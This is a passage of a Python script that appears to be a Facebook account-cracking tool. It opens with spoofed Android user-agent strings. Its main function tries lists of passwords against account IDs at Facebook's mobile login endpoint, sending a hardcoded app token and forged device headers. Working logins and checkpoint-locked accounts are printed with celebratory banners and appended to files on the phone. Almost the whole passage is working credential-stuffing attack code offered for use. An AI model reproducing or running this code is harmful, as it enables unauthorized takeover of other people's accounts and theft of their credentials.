    ua95='Dalvik/2.1.0 (Linux; U; Android 10; CDY-NX9A Build/HUAWEICDY-N29H)'
    ua96='Dalvik/2.1.0 (Linux; U; Android 6.0; NEM-AL10 Build/HONORNEM-AL10) iPhone/8.0'
    ua97='Dalvik/2.1.0 (Linux; U; Android 9.0.0; iphone11x Build/R16NW)'
    ua98='Dalvik/2.1.0 (Linux; U; Android 10.1; iphone Build/LRX21M)'
    ua99='Dalvik/2.1.0 (Linux; U; Android 10; Iphone12 pro max Build/JDQ39)'
    ua100='Dalvik/2.1.0 (Linux; U; Android 11; iPhone 13 Pro Max Build/RQ3A.211001.001)'
    return random.choice([ua1,ua2,ua3,ua4,ua5,ua6,ua7,ua8,ua9,ua10,ua11,ua12,ua13,ua14,ua15,ua16,ua17,ua18,ua19,ua20,ua21,ua22,ua23,ua24,ua25,ua26,ua27,ua28,ua29,ua30,ua31,ua32,ua33,ua34,ua35,ua36,ua37,ua38,ua39,ua40,ua41,ua42,ua43,ua44,ua45,ua46,ua47,ua48,ua49,ua50,ua51,ua52,ua53,ua54,ua55,ua56,ua57,ua58,ua59,ua60,ua61,ua62,ua63,ua64,ua65,ua66,ua67,ua68,ua69,ua70,ua71,ua72,ua73,ua74,ua75,ua76,ua77,ua78,ua79,ua80,ua81,ua82,ua83,ua84,ua85,ua86,ua87,ua88,ua89,ua90,ua91,ua92,ua93,ua94,ua95,ua96,ua97,ua98,ua99,ua100])
def crackfree(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r{H}[BLACK{P}><[{H}\x1b[38;5;46m{loop}{P}]{P}><[{H}\x1b[38;5;46m{len(id)}{P}]><[OK{P}-{H}{ok}{P}]><[{P}\x1b[38;5;46m{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ses = requests.Session()
    for pw in pwv:
        try:
            data = {
            "adid": str(uuid.uuid4()),
            "format": "json",
            "device_id": str(uuid.uuid4()),
            "cpl": "true",
            "family_device_id": str(uuid.uuid4()),
            "credentials_type": "device_based_login_password",
            "error_detail_type": "button_with_disabled",
            "source": "device_based_login",
            "email": idf,
            "password": pw,
            "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
            "generate_session_cookies": "1",
            "meta_inf_fbmeta": "",
            "advertiser_id": str(uuid.uuid4()),
            "currently_logged_in_userid": "0",
            "locale": "en_GB",
            "client_country_code": "GB",
            "method": "auth.login",
            "fb_api_req_friendly_name": "authenticate",
            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
            "api_key": "882a8490361da98702bf97a021ddc14d"}
            headers = {
            'User-Agent': BLACK(),
            'Content-Type': 'application/x-www-form-urlencoded',
            'Host': 'graph.facebook.com',
            'X-FB-Net-HNI': str(random.randint(20000, 40000)),
            'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
            'X-FB-Connection-Type': 'MOBILE.LTE',
            'X-Tigon-Is-Retry': 'False',
            'X-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
            'X-fb-device-group': '5120',
            'X-FB-Friendly-Name': 'ViewerReactionsMutation',
            'X-FB-Request-Analytics-Tags': 'graphservice',
            'X-FB-HTTP-Engine': 'Liger',
            'X-FB-Client-IP': 'True',
            'X-FB-Server-Cluster': 'True',
            'X-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
            po = ses.post('https://b-graph.facebook.com/auth/login',data,headers,allow_redirects=False).json()
            if "www.facebook.com" in po:
                print('\033[0;361;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
                print(f"\033[33;91m𝐁𝐀𝐃 𝐋𝐔𝐂𝐊╔══➻🖤 \033[38;5;46m𝐔𝐈𝐃      ╔══➻ \033[1;92m{idf} ")
                print(f"\033[33;91m𝐁𝐀𝐃 𝐋𝐔𝐂𝐊╚══➻🖤 \033[38;5;46m𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝 ╚══➻ \033[0;91m{pw}")
                print(f"\033[1;32m𝐂𝐫𝐞𝐚𝐭𝐢𝐨𝐧 𝐃𝐚𝐭𝐞 "+CYBER(idf)+"")
                os.system('espeak -a 300 " Sorry,  You,  Have,  Got,  Cp,  Id"')
                open('/sdcard/BLACK-CP.txt', 'a').write( idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                cp+=1
                break
            elif "access_token" in po:
                ok+=1
                print(f"\033[33;1m𝐂𝐨𝐧𝐠𝐫𝐚𝐭𝐮𝐥𝐚𝐭𝐢𝐨𝐧𝐬 ╔══➻💙 \033[38;5;96m𝐔𝐈𝐃      ╔══➻\033[38;5;86m {idf} ")
                print(f"\033[33;1m𝐂𝐨𝐧𝐠𝐫𝐚𝐭𝐮𝐥𝐚𝐭𝐢𝐨𝐧𝐬 ╠══➻💚 \033[38;5;96m𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝 ╠══➻\033[1;97m {pw}")
                print(f"\033[1;32m??𝐫𝐞𝐚𝐭𝐢𝐨𝐧 𝐃𝐚𝐭𝐞 "+CYBER(idf)+"")
                os.system('espeak -a 300 " Congratulation,  You,  Have,  Got,  Ok,  id"')
                open('/sdcard/BLACK-OK.txt', 'a').write( idf+' • '+pw+' | '+MAHADI()+'\n')
                break
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop+=1

if __name__=='__main__':
    pass
    
menu()